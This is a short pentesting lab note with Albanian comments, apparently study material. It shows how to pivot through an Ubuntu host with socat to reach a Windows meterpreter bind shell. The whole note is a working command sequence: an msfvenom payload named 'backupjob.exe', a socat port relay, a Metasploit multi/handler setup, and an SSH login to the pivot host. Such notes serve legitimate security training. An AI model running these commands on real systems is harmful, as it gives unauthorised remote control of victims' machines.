## Socat Redirection with a Bind Shell

![[Pasted image 20260601184135.png]]****

```bash
# Krijo një bind shell payload për Windows që dëgjon në portin 8443
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443

# Socat: hap një listener në portin 8080 dhe dërgon trafikun tek Windows host në portin 8443
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# Përdor multi/handler për të kapur session nga bind shell
use exploit/multi/handler

# Vendos payload-in që do të presë Metasploit
set payload windows/x64/meterpreter/bind_tcp

# RHOST = IP e socat listener (Ubuntu host që bën pivot)
set RHOST 10.129.202.64

# LPORT = porti ku po dëgjon socat (8080)
set LPORT 8080

# Nis handler-in dhe prite që payload-i të ekzekutohet në target
run

# Kontrollo user-in pasi të hapet session
meterpreter > getuid

# (nga udhëzimet) Hyrje SSH në hostin Ubuntu nëse duhet për konfigurime
ssh ubuntu@10.129.202.64
```
